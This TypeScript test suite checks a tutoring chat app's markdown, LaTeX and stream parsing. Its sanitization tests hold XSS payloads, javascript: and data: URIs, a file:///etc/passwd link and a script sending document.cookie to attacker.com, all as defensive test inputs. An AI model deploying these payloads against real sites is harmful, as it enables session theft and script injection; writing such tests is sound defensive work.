/**
 * =============================================================================
 * EMPIRICAL ADVERSARIAL STRESS & SECURITY VERIFICATION SUITE
 * Milestone 4: Markdown AST, LaTeX Math & Security Hardening
 * File: tests/tier1-feature/challengerSocratesM4Security.test.ts
 *
 * Verifies:
 * 1. Adversarial Markdown Injection:
 *    - Unclosed triple backticks with nested template literals / single backticks
 *    - Massive code blocks (10,000 lines) with performance benchmark (<250ms)
 *    - Obscure, malicious, and special-character language tags
 *    - Empty code blocks and trailing/leading whitespace variations
 * 2. LaTeX Math Stress Testing:
 *    - Single-line $$...$$ mathematical formulas
 *    - Multi-line block math with formula on line 0
 *    - Math on both opening fence line and closing fence line
 *    - In-flight unclosed $$ streaming token auto-recovery
 *    - Currency symbol collision testing ($5.00 vs $x = 2$) & escaped currency
 *    - Complex mathematical notation transformation (O(n log n), summations, fractions)
 *    - Adversarial challenge on unbraced summation exponents (\sum_{i=1}^n)
 * 3. Malicious Link & XSS Scheme Whitelist Sanitization:
 *    - Strict protocol whitelist: javascript:, data:, vbscript:, entity obfuscation
 *    - Allowed safe schemes: https://, http://, /, mailto:
 *    - HTML injection immunity in table headers, table cells, code blocks, math
 * 4. CRLF & Fragmented SSE Stream Processing:
 *    - Multi-packet fragmentation at payload boundaries (data: {"de | lta":"hello"})
 *    - Reassembly of 1-byte chunked LF streams
 *    - Adversarial challenge: CRLF stream fragmentation across \r and \n boundaries
 *    - Non-JSON streaming fallback tokens
 *    - HTTP 503 error classification and stream cancellation token preservation
 * 5. Static Architectural Isolation Audit:
 *    - Zero imports or endpoints connecting to CR Intelligence (port 8000, CR tables, /api/cr/*)
 * =============================================================================
 */

import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as path from "node:path";
import React from "react";

// Dual-path runner resolution
let rawDescribe: (name: string, fn: () => void | Promise<void>) => void;
let rawIt: (name: string, fn: () => void | Promise<void>) => void;

try {
  const runner = require("../run-all-tests");
  rawDescribe = runner.describe;
  rawIt = runner.it;
} catch {
  const runner = require("../../tests/run-all-tests");
  rawDescribe = runner.describe;
  rawIt = runner.it;
}

interface LocalCase {
  name: string;
  fn: () => void | Promise<void>;
}
interface LocalSuite {
  name: string;
  cases: LocalCase[];
}
const localSuites: LocalSuite[] = [];
let activeLocalSuite: LocalSuite | null = null;

const describe = (name: string, fn: () => void) => {
  activeLocalSuite = { name, cases: [] };
  localSuites.push(activeLocalSuite);
  try {
    rawDescribe(name, fn);
  } finally {
    activeLocalSuite = null;
  }
};

const it = (name: string, fn: () => void | Promise<void>) => {
  if (activeLocalSuite) {
    activeLocalSuite.cases.push({ name, fn });
  }
  rawIt(name, fn);
};

// Imports under test
import {
  recoverStreamingMarkdown,
  parseMarkdownBlocks,
  renderLatex,
  parseInline,
  sanitizeMarkdownUrl,
} from "../../src/components/socrates/SocratesMarkdown";

import {
  parseSSEStreamChunks,
  classifyChatError,
  applyStreamCancellation,
} from "../../src/components/socrates/useSocratesChat";

// =============================================================================
// Test Suite 1: Adversarial Markdown Injection & AST Stress Testing
// =============================================================================
describe("Challenger M4 — 1. Adversarial Markdown Injection & AST Stress", () => {
  it("recovers unclosed code fences with nested backticks and template literals", () => {
    const raw = "```typescript\nconst message = `Result: ${x}`;\nconst sql = 'SELECT * FROM users';";
    const recovered = recoverStreamingMarkdown(raw);
    assert.ok(recovered.endsWith("\n```"), "Must append closing code fence for odd backtick blocks");

    const blocks = parseMarkdownBlocks(raw);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "code");
    if (blocks[0].type === "code") {
      assert.equal(blocks[0].lang, "typescript");
      assert.ok(blocks[0].code.includes("const message = `Result: ${x}`;"));
      assert.ok(blocks[0].code.includes("SELECT * FROM users"));
    }
  });

  it("handles obscure, malicious, and special-character language tags without crashing", () => {
    const edgeCases = [
      { lang: "f#", code: "let x = 42" },
      { lang: "c++", code: "int main() { return 0; }" },
      { lang: "brainfuck", code: "++[>++<-]" },
      { lang: "<script>alert('xss')</script>", code: "alert(1)" },
      { lang: "a".repeat(128), code: "console.log('long tag');" },
      { lang: "!@#$%^&*()_+", code: "echo 'symbol tag'" },
    ];

    for (const ec of edgeCases) {
      const markdown = `\`\`\`${ec.lang}\n${ec.code}\n\`\`\``;
      const blocks = parseMarkdownBlocks(markdown);
      assert.equal(blocks.length, 1);
      assert.equal(blocks[0].type, "code");
      if (blocks[0].type === "code") {
        assert.equal(blocks[0].lang, ec.lang);
        assert.equal(blocks[0].code, ec.code);
      }
    }
  });

  it("processes massive code blocks (10,000 lines) within performance budget (<250ms)", () => {
    const lineCount = 10000;
    const lines: string[] = [];
    for (let i = 1; i <= lineCount; i++) {
      lines.push(`const variable_${i} = ${i} * 2; // Iteration step ${i}`);
    }
    const massiveMarkdown = `\`\`\`typescript\n${lines.join("\n")}\n\`\`\``;

    const start = performance.now();
    const blocks = parseMarkdownBlocks(massiveMarkdown);
    const durationMs = performance.now() - start;

    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "code");
    if (blocks[0].type === "code") {
      assert.equal(blocks[0].lang, "typescript");
      const parsedLines = blocks[0].code.split("\n");
      assert.equal(parsedLines.length, lineCount);
      assert.equal(parsedLines[0], "const variable_1 = 1 * 2; // Iteration step 1");
      assert.equal(parsedLines[lineCount - 1], `const variable_${lineCount} = ${lineCount} * 2; // Iteration step ${lineCount}`);
    }
    assert.ok(durationMs < 250, `Massive block parse took ${durationMs.toFixed(2)}ms, exceeding 250ms budget`);
  });

  it("handles empty and whitespace-only code fences cleanly", () => {
    const emptyFence = "```\n```";
    const blocks = parseMarkdownBlocks(emptyFence);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "code");
    if (blocks[0].type === "code") {
      assert.equal(blocks[0].code, "");
      assert.equal(blocks[0].lang, "");
    }

    const whitespaceFence = "```python   \n   \n```";
    const wsBlocks = parseMarkdownBlocks(whitespaceFence);
    assert.equal(wsBlocks.length, 1);
    assert.equal(wsBlocks[0].type, "code");
    if (wsBlocks[0].type === "code") {
      assert.equal(wsBlocks[0].lang, "python");
      assert.equal(wsBlocks[0].code, "   ");
    }
  });

  it("parses multiple sequential code blocks and interspersed text correctly", () => {
    const markdown = [
      "Introductory explanation:",
      "```python",
      "def solve():",
      "    return True",
      "```",
      "Now in C++:",
      "```cpp",
      "bool solve() {",
      "    return true;",
      "}",
      "```",
      "Final closing thoughts.",
    ].join("\n");

    const blocks = parseMarkdownBlocks(markdown);
    assert.equal(blocks.length, 5);
    assert.equal(blocks[0].type, "paragraph");
    assert.equal(blocks[1].type, "code");
    assert.equal(blocks[2].type, "paragraph");
    assert.equal(blocks[3].type, "code");
    assert.equal(blocks[4].type, "paragraph");
  });
});

// =============================================================================
// Test Suite 2: LaTeX Math Typography & Formula Stress Testing
// =============================================================================
describe("Challenger M4 — 2. LaTeX Math Typography & Formula Stress", () => {
  it("parses single-line $$...$$ with complex integrals and fractions", () => {
    const raw = "$$\\int_0^\\infty e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}$$";
    const blocks = parseMarkdownBlocks(raw);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "math_block");
    if (blocks[0].type === "math_block") {
      assert.equal(blocks[0].latex, "\\int_0^\\infty e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}");
    }
  });

  it("captures multi-line block math with formula on line 0", () => {
    const raw = [
      "$$\\sum_{i=1}^n i = \\frac{n(n+1)}{2}",
      "\\prod_{i=1}^n i = n!",
      "$$",
    ].join("\n");

    const blocks = parseMarkdownBlocks(raw);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "math_block");
    if (blocks[0].type === "math_block") {
      assert.equal(
        blocks[0].latex,
        "\\sum_{i=1}^n i = \\frac{n(n+1)}{2}\n\\prod_{i=1}^n i = n!"
      );
    }
  });

  it("captures formulas on both opening line and closing line fences", () => {
    const raw = [
      "$$E = mc^2",
      "F = ma$$",
    ].join("\n");

    const blocks = parseMarkdownBlocks(raw);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "math_block");
    if (blocks[0].type === "math_block") {
      assert.equal(blocks[0].latex, "E = mc^2\nF = ma");
    }
  });

  it("recovers in-flight unclosed $$ streaming tokens without dropping content", () => {
    const inFlightStream = "$$\\frac{1}{2\\pi i} \\oint_C \\frac{f(z)}{z - z_0} dz";
    const recovered = recoverStreamingMarkdown(inFlightStream);
    assert.ok(recovered.endsWith("\n$$"), "Streaming recovery must append closing $$");

    const blocks = parseMarkdownBlocks(inFlightStream);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "math_block");
    if (blocks[0].type === "math_block") {
      assert.equal(blocks[0].latex, "\\frac{1}{2\\pi i} \\oint_C \\frac{f(z)}{z - z_0} dz");
    }
  });

  it("handles currency symbols ($5.00 vs $x = 2$) and escaped dollar signs (\\$5.00)", () => {
    // Escaped dollars
    const escaped = "The book is \\$5.00 and shipping is \\$10.00.";
    const blocks1 = parseMarkdownBlocks(escaped);
    assert.equal(blocks1.length, 1);
    assert.equal(blocks1[0].type, "paragraph");

    const parsedInlineEscaped = parseInline(escaped);
    assert.ok(Array.isArray(parsedInlineEscaped));
    // Verify escaped dollar replacement in cleanText
    const combinedText = (parsedInlineEscaped as React.ReactElement<any>[]).map((el) => (el?.props as any)?.children || "").join("");
    assert.ok(combinedText.includes("$5.00") && combinedText.includes("$10.00"));
    assert.ok(!combinedText.includes("\\$"));

    // Inline math vs literal text
    const mixed = "Formula: $x = 2$ but costs \\$100.";
    const mixedBlocks = parseMarkdownBlocks(mixed);
    assert.equal(mixedBlocks.length, 1);
    assert.equal(mixedBlocks[0].type, "paragraph");
  });

  it("transforms complex asymptotic notations and braced summations via renderLatex", () => {
    // Asymptotic bounds
    const asymptotic = renderLatex("\\mathcal{O}(n \\log n) \\le \\Theta(n^2)", false);
    assert.ok(React.isValidElement(asymptotic));
    const asymptoticText = String((asymptotic as React.ReactElement<any>).props.children);
    assert.ok(asymptoticText.includes("𝒪(n log n)"), `Must transform \\mathcal{O} and \\log, got: ${asymptoticText}`);
    assert.ok(asymptoticText.includes("Θ(n^2)"), `Must transform \\Theta, got: ${asymptoticText}`);
    assert.ok(asymptoticText.includes("≤"), `Must transform \\le to ≤, got: ${asymptoticText}`);

    // Fractions and braced summations: \sum_{i=1}^{n}
    const sumFrac = renderLatex("\\sum_{i=1}^{n} \\frac{a_i}{b_i}", false);
    const sumFracText = String((sumFrac as React.ReactElement<any>).props.children);
    assert.ok(sumFracText.includes("∑ [i=1 to n]"), `Must transform braced summation, got: ${sumFracText}`);
    assert.ok(sumFracText.includes("(a_i / b_i)"), `Must transform fraction, got: ${sumFracText}`);

    // Operators and Greek letters
    const operators = renderLatex("\\alpha + \\beta \\ge \\gamma \\times \\delta \\ne \\infty", false);
    const operatorsText = String((operators as React.ReactElement<any>).props.children);
    assert.ok(operatorsText.includes("α"), "Must include α");
    assert.ok(operatorsText.includes("β"), "Must include β");
    assert.ok(operatorsText.includes("≥"), "Must include ≥");
    assert.ok(operatorsText.includes("×"), "Must include ×");
    assert.ok(operatorsText.includes("≠"), "Must include ≠");
    assert.ok(operatorsText.includes("∞"), "Must include ∞");
  });

  it("adversarial challenge: unbraced single-character summation exponents (\\sum_{i=1}^n)", () => {
    // Standard LaTeX allows unbraced single-character exponent notation: \sum_{i=1}^n
    // Code comment in SocratesMarkdown.tsx line 318 explicitly states: "// Handle Summations: \sum_{i=1}^n"
    const unbracedSum = renderLatex("\\sum_{i=1}^n \\frac{a_i}{b_i}", false);
    assert.ok(React.isValidElement(unbracedSum));
    const text = String((unbracedSum as React.ReactElement<any>).props.children);
    // When regex requires ^{...}, \sum_{i=1}^n fails to capture 'n' into bracket, resulting in '∑ [i=1]^n'
    assert.ok(
      text.includes("∑ [i=1 to n]"),
      `Unbraced summation '\\sum_{i=1}^n' was not transformed to '∑ [i=1 to n]' (rendered as: '${text}')`
    );
  });
});

// =============================================================================
// Test Suite 3: Malicious Link & XSS Scheme Whitelist Sanitization
// =============================================================================
describe("Challenger M4 — 3. Malicious Link & XSS Scheme Whitelist", () => {
  it("neutralizes dangerous and obfuscated URI schemes to '#' in sanitizeMarkdownUrl", () => {
    const maliciousSchemes = [
      "javascript:alert(1)",
      "JAVASCRIPT:alert(document.cookie)",
      "  javascript:alert('space')  ",
      "javascript:void(0)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "data:image/svg+xml;utf8,<svg onload=alert(1)>",
      "vbscript:msgbox(\"pwned\")",
      "VBSCRIPT:alert(1)",
      "jav&#x09;ascript:alert(1)",
      "blob:https://example.com/deadbeef",
      "file:///etc/passwd",
      "file:///C:/Windows/System32/calc.exe",
      "about:blank",
      "",
    ];

    for (const unsafeUrl of maliciousSchemes) {
      const sanitized = sanitizeMarkdownUrl(unsafeUrl);
      assert.equal(
        sanitized,
        "#",
        `Unsafe scheme '${unsafeUrl}' was not mapped to '#' (got '${sanitized}')`
      );
    }
  });

  it("preserves legitimate and safe URLs in sanitizeMarkdownUrl", () => {
    const safeUrls = [
      "https://qwenlm.github.io",
      "http://localhost:3000/socrates",
      "https://en.wikipedia.org/wiki/Socratic_method",
      "/socrates",
      "/api/socrates/health",
      "mailto:socrates@university.edu",
    ];

    for (const safeUrl of safeUrls) {
      const sanitized = sanitizeMarkdownUrl(safeUrl);
      assert.equal(sanitized, safeUrl, `Safe URL '${safeUrl}' was unexpectedly mutated to '${sanitized}'`);
    }
  });

  it("neutralizes XSS injection payloads in Markdown links via parseInline", () => {
    const maliciousMarkdown = "[Click me for XP](javascript:fetch('/api/drain-xp'))";
    const nodes = parseInline(maliciousMarkdown);
    assert.ok(Array.isArray(nodes));

    const linkNode = (nodes as React.ReactElement<any>[]).find((el) => (el as any)?.type === "a") as React.ReactElement<any>;
    assert.ok(linkNode, "Must render an anchor tag");
    assert.equal(linkNode.props.href, "#", "Malicious href must be sanitized to '#'");
    assert.equal(linkNode.props.target, "_blank");
    assert.equal(linkNode.props.rel, "noopener noreferrer");
  });

  it("safely handles HTML and script injection in table headers and table rows", () => {
    const tableMarkdown = [
      "| Header <script>alert('xss1')</script> | Score <img src=x onerror=alert(1)> |",
      "| --- | --- |",
      "| Row <svg onload=alert(1)> | Value <b>safe</b> |",
    ].join("\n");

    const blocks = parseMarkdownBlocks(tableMarkdown);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "table");
    if (blocks[0].type === "table") {
      assert.equal(blocks[0].headers[0], "Header <script>alert('xss1')</script>");
      assert.equal(blocks[0].rows[0][0], "Row <svg onload=alert(1)>");
    }
  });

  it("safely renders raw HTML inside code blocks without execution", () => {
    const codeMarkdown = [
      "```html",
      "<script>",
      "  document.location = 'https://attacker.com/?steal=' + document.cookie;",
      "</script>",
      "```",
    ].join("\n");

    const blocks = parseMarkdownBlocks(codeMarkdown);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "code");
    if (blocks[0].type === "code") {
      assert.equal(blocks[0].lang, "html");
      assert.ok(blocks[0].code.includes("<script>"));
      assert.ok(blocks[0].code.includes("document.location"));
    }
  });

  it("safely renders HTML tags within LaTeX math formulas as text tokens", () => {
    const mathWithHtml = "$$\\text{<script>alert('math xss')</script>}$$";
    const blocks = parseMarkdownBlocks(mathWithHtml);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "math_block");

    const node = renderLatex(blocks[0].type === "math_block" ? blocks[0].latex : "", true);
    assert.ok(React.isValidElement(node));
    // Verify rendered node contains sanitized text without dangerouslySetInnerHTML injection
    assert.equal(((node as React.ReactElement<any>).props as any)?.dangerouslySetInnerHTML, undefined);
  });
});

// =============================================================================
// Test Suite 4: CRLF & Fragmented SSE Stream Processing
// =============================================================================
describe("Challenger M4 — 4. CRLF & Fragmented SSE Stream Processing", () => {
  it("handles multi-chunk fragmented event across payload boundaries (data: {\"de | lta\":\"hello\"}\\r\\n\\r\\n)", () => {
    const chunk1 = "event: token\r\ndata: {\"de";
    const chunk2 = "lta\":\"hello\"}\r\n\r\n";

    let tokenReceived = "";
    const res1 = parseSSEStreamChunks("", chunk1, {
      onToken: (t) => { tokenReceived += t; },
    });
    assert.equal(tokenReceived, "", "Should not emit token on incomplete first chunk");
    assert.equal(res1.remainingBuffer, "event: token\ndata: {\"de");

    const res2 = parseSSEStreamChunks(res1.remainingBuffer, chunk2, {
      onToken: (t) => { tokenReceived += t; },
    });
    assert.equal(tokenReceived, "hello", "Must emit reassembled token");
    assert.equal(res2.remainingBuffer, "");
  });

  it("reassembles arbitrary byte-fragmented SSE stream chunks on standard LF streams (1-byte chunking)", () => {
    const lfPayload =
      "event: stage\ndata: {\"stage\":\"grounding\",\"text\":\"Searching...\"}\n\n" +
      "event: token\ndata: {\"delta\":\"Algorithm\"}\n\n" +
      "event: token\ndata: {\"delta\":\" Complexity\"}\n\n" +
      "event: done\ndata: {\"conversationId\":\"c123\",\"totalTokens\":2}\n\n";

    let stages: any[] = [];
    let tokens: string[] = [];
    let doneEvent: any = null;

    let buffer = "";
    for (let i = 0; i < lfPayload.length; i++) {
      const char = lfPayload[i];
      const res = parseSSEStreamChunks(buffer, char, {
        onStage: (s) => stages.push(s),
        onToken: (t) => tokens.push(t),
        onDone: (d) => { doneEvent = d; },
      });
      buffer = res.remainingBuffer;
    }

    assert.equal(stages.length, 1);
    assert.equal(stages[0].stage, "grounding");
    assert.equal(tokens.length, 2);
    assert.equal(tokens[0], "Algorithm");
    assert.equal(tokens[1], " Complexity");
    assert.ok(doneEvent);
    assert.equal(doneEvent.conversationId, "c123");
    assert.equal(buffer, "");
  });

  it("adversarial challenge: CRLF stream fragmentation across \\r and \\n boundaries", () => {
    // In HTTP CRLF streams, TCP packet boundaries can split between \r and \n.
    // If chunk1 ends with \r, and chunk2 starts with \n, replacing \r with \n prematurely turns \r\n into \n\n,
    // which incorrectly terminates the frame before the data payload arrives.
    const chunk1 = "event: stage\r";
    const chunk2 = "\ndata: {\"stage\":\"grounding\",\"text\":\"Searching...\"}\r\n\r\n";

    let stageResult: any = null;
    const res1 = parseSSEStreamChunks("", chunk1, {
      onStage: (s) => { stageResult = s; },
    });

    const res2 = parseSSEStreamChunks(res1.remainingBuffer, chunk2, {
      onStage: (s) => { stageResult = s; },
    });

    assert.ok(
      stageResult !== null,
      "Event must not be dropped when TCP packet splits between '\\r' and '\\n'"
    );
    assert.equal(stageResult?.stage, "grounding");
  });

  it("parses non-JSON raw string tokens gracefully without dropping tokens", () => {
    const rawStream = "event: token\r\ndata: plain raw streaming text without json\r\n\r\n";
    let tokenEmitted = "";

    const res = parseSSEStreamChunks("", rawStream, {
      onToken: (t) => { tokenEmitted = t; },
    });

    assert.equal(tokenEmitted, "plain raw streaming text without json");
    assert.equal(res.remainingBuffer, "");
  });

  it("handles HTTP 503 error payloads accurately via classifyChatError", () => {
    // 1. Explicit COLIBRI_OFFLINE 503
    const err1 = classifyChatError(503, { code: "COLIBRI_OFFLINE", error: "Colibri engine unreachable" });
    assert.equal(err1.isOffline, true);
    assert.equal(err1.code, "COLIBRI_OFFLINE");
    assert.equal(err1.message, "Colibri engine unreachable");
    assert.equal(err1.status, 503);

    // 2. 503 with missing errorData
    const err2 = classifyChatError(503, null);
    assert.equal(err2.isOffline, true);
    assert.equal(err2.code, "COLIBRI_OFFLINE");
    assert.ok(err2.message.includes("offline"));

    // 3. 500 server error
    const err3 = classifyChatError(500, { error: "Database error", code: "INTERNAL_ERROR" });
    assert.equal(err3.isOffline, false);
    assert.equal(err3.status, 500);

    // 4. 429 rate limit error
    const err4 = classifyChatError(429, { message: "Daily quota exhausted", code: "RATE_LIMIT" });
    assert.equal(err4.isOffline, false);
    assert.equal(err4.status, 429);
  });

  it("preserves accumulated tokens and resets streaming state via applyStreamCancellation", () => {
    const initialMessages = [
      { id: "m1", role: "user", content: "Explain merge sort." },
      { id: "m2", role: "assistant", content: "Merge sort is an O(n log n) algorithm that...", isStreaming: true },
    ];

    const { updatedMessages, stateReset } = applyStreamCancellation(initialMessages);

    assert.equal(updatedMessages.length, 2);
    assert.equal(updatedMessages[1].isStreaming, false);
    assert.equal(updatedMessages[1].content, "Merge sort is an O(n log n) algorithm that...");
    assert.deepEqual(stateReset, {
      isStreaming: false,
      isLoading: false,
      activeStage: null,
    });
  });
});

// =============================================================================
// Test Suite 5: Static Architectural Isolation Audit
// =============================================================================
describe("Challenger M4 — 5. Static Architectural Isolation Audit", () => {
  it("verifies Socrates components and hooks have ZERO imports or calls to CR Intelligence", () => {
    const targetDirs = [
      path.resolve(process.cwd(), "src/components/socrates"),
      path.resolve(process.cwd(), "src/lib/socrates"),
      path.resolve(process.cwd(), "src/app/socrates"),
    ];

    const forbiddenPatterns = [
      { regex: /CRConversation/i, name: "CRConversation table" },
      { regex: /CRMessage/i, name: "CRMessage table" },
      { regex: /\/api\/cr\//i, name: "CR API endpoints (/api/cr/*)" },
      { regex: /127\.0\.0\.1:8000/i, name: "Port 8000 CR backend" },
      { regex: /localhost:8000/i, name: "Port 8000 localhost" },
      { regex: /ai-tutor\/chat/i, name: "Old CR chat route" },
      { regex: /\/api\/battle/i, name: "Battle arena API" },
    ];

    let inspectedFilesCount = 0;

    for (const dir of targetDirs) {
      if (!fs.existsSync(dir)) continue;
      const fileNames = fs.readdirSync(dir).filter((f) => f.endsWith(".ts") || f.endsWith(".tsx"));

      for (const fileName of fileNames) {
        inspectedFilesCount++;
        const filePath = path.join(dir, fileName);
        const content = fs.readFileSync(filePath, "utf-8");

        for (const { regex, name } of forbiddenPatterns) {
          const match = regex.test(content);
          assert.equal(
            match,
            false,
            `Architectural boundary violation in ${filePath}: matched forbidden pattern '${name}' (${regex})`
          );
        }
      }
    }

    assert.ok(inspectedFilesCount >= 10, `Expected at least 10 Socrates source files to be audited, got ${inspectedFilesCount}`);
  });

  it("verifies Socrates client network requests target exclusively /api/socrates/*", () => {
    const clientHookPath = path.resolve(process.cwd(), "src/components/socrates/useSocratesChat.ts");
    assert.ok(fs.existsSync(clientHookPath), "useSocratesChat.ts must exist");

    const content = fs.readFileSync(clientHookPath, "utf-8");
    const fetchCalls = content.match(/fetch\s*\(\s*[`"']([^`"']+)`?['"]/g) || [];

    for (const call of fetchCalls) {
      assert.ok(
        call.includes("/api/socrates/"),
        `Client fetch call '${call}' does not target /api/socrates/* endpoint`
      );
    }
  });
});

// =============================================================================
// Standalone CLI Direct Execution
// =============================================================================
if (process.argv[1]?.includes("challengerSocratesM4Security")) {
  (async () => {
    console.log("\n=======================================================");
    console.log("  CHALLENGER SOCRATES M4 SECURITY SUITE (DIRECT RUN)   ");
    console.log("=======================================================\n");

    let total = 0;
    let passed = 0;
    let failed = 0;
    const startTime = Date.now();

    for (const suite of localSuites) {
      console.log(`\n\x1b[36m▶ ${suite.name}\x1b[0m`);
      for (const tc of suite.cases) {
        total++;
        const caseStart = Date.now();
        try {
          await tc.fn();
          passed++;
          const duration = Date.now() - caseStart;
          console.log(`  \x1b[32m✔ PASS\x1b[0m ${tc.name} \x1b[90m(${duration}ms)\x1b[0m`);
        } catch (err: any) {
          failed++;
          const duration = Date.now() - caseStart;
          console.error(`  \x1b[31m✘ FAIL\x1b[0m ${tc.name} \x1b[90m(${duration}ms)\x1b[0m`);
          console.error(`    \x1b[31mError:\x1b[0m ${err.message}`);
          if (err.stack) {
            console.error(`    \x1b[90m${err.stack.split("\n").slice(1, 4).join("\n    ")}\x1b[0m`);
          }
        }
      }
    }

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(3);
    console.log("\n-------------------------------------------------------");
    console.log(`Test Results: ${passed} passed, ${failed} failed, ${total} total (${elapsed}s)`);
    console.log("-------------------------------------------------------\n");

    if (failed > 0) {
      process.exit(1);
    }
  })();
}
